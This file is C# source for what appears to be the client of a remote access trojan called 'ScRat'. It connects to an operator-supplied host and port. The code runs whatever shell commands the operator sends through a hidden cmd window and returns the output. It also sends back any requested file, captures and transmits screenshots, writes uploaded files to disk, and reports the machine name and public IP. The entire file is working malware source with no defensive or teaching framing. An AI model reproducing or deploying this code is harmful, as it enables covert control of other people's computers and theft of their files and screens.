using ScRat.net;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace ScRat
{
    class Program
    {
        static void run(ConnectionHandler connectionHandler)
        {
            byte[] fileFileBuffer = new byte[0];
            string fileFileName = "";
            int fileFileIndex = 0;

            while (connectionHandler.socket.Connected)
            {
                Packet packet = connectionHandler.getPacket();
                if (packet == null) continue;
                if (packet.type == PacketType.User)
                {
                    Trace.WriteLine("Requested profile");
                    string data = Environment.MachineName + "||SpRatoR||" + Helper.httpGet("http://ipinfo.io/ip");
                    connectionHandler.sendPacket(new Packet(PacketType.User, Encoding.ASCII.GetBytes(data)));
                }
                else if (packet.type == PacketType.Shell)
                {
                    string cmd = Encoding.ASCII.GetString(packet.data);
                    Trace.WriteLine("Running command: " + cmd);
                    Process process = new Process()
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "cmd",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            Arguments = "/C " + cmd
                        }
                    };

                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    if (output.Length > 0) connectionHandler.sendPacket(new Packet(PacketType.Shell, Encoding.ASCII.GetBytes(output)));
                    if (error.Length > 0) connectionHandler.sendPacket(new Packet(PacketType.Error, Encoding.ASCII.GetBytes(error)));
                }
                else if (packet.type == PacketType.Download)
                {
                    string path = Encoding.ASCII.GetString(packet.data);
                    Trace.WriteLine("Requesting file: " + path);
                    byte[] fileData = Helper.readFile(path);
                    if (fileData == null)
                        connectionHandler.sendPacket(new Packet(PacketType.Error, Encoding.ASCII.GetBytes("File path \"" + path + "\" does not exist")));
                    else
                    {
                        path = Path.GetFileName(path);

                        byte[] info = new byte[1 + 4 + 1 + path.Length + 1];
                        info[0] = 0;
                        byte[] dataLength = BitConverter.GetBytes(fileData.Length);
                        dataLength.CopyTo(info, 1);
                        info[5] = (byte)path.Length;
                        Array.Copy(Encoding.ASCII.GetBytes(path), 0, info, 6, path.Length);
                        connectionHandler.sendPacket(new Packet(PacketType.Download, info));

                        int bufferSize = 1024;
                        int bytesSent = 0;
                        int bytesLeft = fileData.Length;

                        while (bytesLeft > 0)
                        {
                            int curDataSize = Math.Min(bufferSize, bytesLeft);

                            byte[] final = new byte[curDataSize + 1];
                            final[0] = 1;
                            Array.Copy(fileData, bytesSent, final, 1, curDataSize);
                            connectionHandler.sendPacket(new Packet(PacketType.Download, final));

                            bytesSent += curDataSize;
                            bytesLeft -= curDataSize;
                        }

                        connectionHandler.sendPacket(new Packet(PacketType.Download, new byte[1] { 2 }));
                    }
                }
                else if (packet.type == PacketType.Exit)
                {
                    Environment.Exit(0);
                    connectionHandler.socket.Close();
                }
                else if (packet.type == PacketType.Screenshot)
                {
                    byte[] screenData;
                    Trace.WriteLine("Screenshot");
                    try
                    {
                        string[] size = Encoding.ASCII.GetString(packet.data).Split(' ');
                        screenData = Helper.captureScreen(new Size(Int32.Parse(size[0]), Int32.Parse(size[1])));
                    }
                    catch (Exception)
                    {
                        connectionHandler.sendPacket(new Packet(PacketType.Error, Encoding.ASCII.GetBytes("No sizes were given")));
                        screenData = null;
                    }
                    if (screenData == null)
                    {
                        connectionHandler.sendPacket(new Packet(PacketType.Error, Encoding.ASCII.GetBytes("Screenshot failed")));
                    }
                    else
                    {
                        byte[] info = new byte[5];
                        info[0] = 0;
                        byte[] dataLength = BitConverter.GetBytes(screenData.Length);
                        dataLength.CopyTo(info, 1);
                        connectionHandler.sendPacket(new Packet(PacketType.Screenshot, info));

                        int bufferSize = 1024;
                        int bytesSent = 0;
                        int bytesLeft = screenData.Length;

                        while (bytesLeft > 0)
                        {
                            int curDataSize = Math.Min(bufferSize, bytesLeft);

                            byte[] final = new byte[curDataSize + 1];
                            final[0] = 1;
                            Array.Copy(screenData, bytesSent, final, 1, curDataSize);
                            connectionHandler.sendPacket(new Packet(PacketType.Screenshot, final));

                            bytesSent += curDataSize;
                            bytesLeft -= curDataSize;
                        }

                        connectionHandler.sendPacket(new Packet(PacketType.Screenshot, new byte[1] { 2 }));
                    }
                }
                else if (packet.type == PacketType.Reconnect)
                {
                    connectionHandler.socket.Close();
                }
                else if (packet.type == PacketType.Upload)
                {
                    if (packet.data[0] == 0)
                    {
                        fileFileBuffer = new byte[BitConverter.ToInt32(packet.data, 1)];
                        fileFileIndex = 0;
                        byte[] nameBytes = new byte[packet.data[5]];
                        Array.Copy(packet.data, 6, nameBytes, 0, packet.data[5]);
                        fileFileName = Encoding.ASCII.GetString(nameBytes);
                        Trace.WriteLine("File: " + fileFileName + " Size: " + String.Format("{0:n0}", fileFileBuffer.Length) + " bytes");
                    }
                    else if (packet.data[0] == 1)
                    {
                        Array.Copy(packet.data, 1, fileFileBuffer, fileFileIndex, packet.data.Length - 1);
                        fileFileIndex += packet.data.Length - 1;
                    }
                    else if (packet.data[0] == 2)
                    {
                        if(Helper.writeFile(fileFileName, fileFileBuffer))
                        {
                            Trace.WriteLine("Successfully downloaded " + fileFileName);
                        }
                        else
                        {
                            Trace.WriteLine("Error in writing file " + fileFileName);
                        }
                        fileFileBuffer = new byte[0] { };
                    }
                    else
                    {
                        Trace.WriteLine("ERRROR!");
                    }
                }
            }
        }
        static void Main(string[] args)
        {
            Trace.Listeners.Add(new TextWriterTraceListener(Console.Out));
            ConnectionHandler connectionHandler;
            try
            {
                connectionHandler = new ConnectionHandler(Dns.GetHostAddresses(args[0])[0], Int32.Parse(args[1]));
                run(connectionHandler);
                Trace.WriteLine("Disconnected from the server");
            }
            catch (Exception)
            {
                Trace.WriteLine(args[0] + ":" + args[1] + " is not a valid ip");
            }
        }
    }
}
